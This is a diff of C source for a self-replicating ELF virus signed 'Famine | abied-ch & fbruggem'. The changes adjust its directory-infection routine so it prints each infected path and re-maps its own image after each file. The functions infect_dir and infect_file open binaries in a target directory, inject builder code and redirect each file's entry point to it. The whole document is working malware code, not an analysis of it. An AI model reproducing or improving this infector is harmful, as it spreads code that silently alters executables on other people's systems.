@@ -11,7 +11,6 @@
 #define BUILDER_SIZE 0x13a;
 #define BUILDER_RE_ENTRY_OFFSET 0xe5;
 __attribute__((section(".text"))) volatile static char signatur[] = "Famine | abied-ch & fbruggem";
-__attribute__((section(".text"))) volatile static uint8_t infected = 0;
 // Structs
 typedef struct {
     uint64_t d_ino;          /* 64-bit inode number */
@@ -48,7 +47,7 @@ __attribute__((always_inline)) inline uint64_t ft_mmap(void *addr, size_t length
 __attribute__((always_inline)) inline int64_t ft_munmap(void *addr, size_t length);
 
 // Functions
-__attribute__((always_inline)) inline int infect_dir(volatile char *dir_path, volatile file *file_self);
+__attribute__((always_inline)) inline int infect_dir(volatile char *dir_path, volatile int fd_self, volatile file *file_self);
 __attribute__((always_inline)) inline int infect_file(volatile char *path, volatile file *file_self);
 __attribute__((always_inline)) inline int file_mmap(int fd, volatile file *file);
 __attribute__((always_inline)) inline int file_munmap(volatile file *file);
@@ -140,7 +139,7 @@ _start() {
     dir0[8] = 't';
     dir0[9] = '\0';
 
-    if (infect_dir(dir0, &file_self)) ft_exit(1);
+    if (infect_dir(dir0, fd_self, &file_self)) ft_exit(1);
 
     Elf64_Ehdr *header = file_self.mem;
 
@@ -152,7 +151,7 @@ _start() {
 // 0x4ef1d0
 
 __attribute__((always_inline)) inline int
-infect_dir(volatile char *dir_path, volatile file *file_self) {
+infect_dir(volatile char *dir_path, volatile int fd_self, volatile file *file_self) {
     int fd_dir = ft_open(dir_path, O_RDONLY, O_DIRECTORY);
     if (fd_dir < 0) return fd_dir;
 
@@ -174,7 +173,11 @@ infect_dir(volatile char *dir_path, volatile file *file_self) {
                 ft_strncpy(dir_path, full_path, ft_strlen(dir_path));
                 full_path[ft_strlen(dir_path)] = '/';
                 ft_strncpy(dirent_cur->d_name, full_path + ft_strlen(dir_path) + 1, ft_strlen(dirent_cur->d_name) + 1);
+                ft_write(1, full_path, ft_strlen(full_path));
+                char nl = '\n';
+                ft_write(1, &nl, 1);
                 infect_file(full_path, file_self);
+                file_mmap(fd_self, file_self);
             }
             dirent_cur = (dirent64 *)((void *)dirent_cur + dirent_cur->d_reclen);
         }
@@ -270,7 +273,7 @@ infect_file(volatile char *path, volatile file *file_self) {
 
     header_target->e_entry = offset_to_addr(&file_target, builder_target_start_offset);
 
-    if (file_write(fd_target, &file_target)) ft_exit(44);
+    if (file_write(fd_target, &file_target)) return 1;
     char index = 'i';
     for (int i = 0; i < scaffold_target_size; i++) {
 
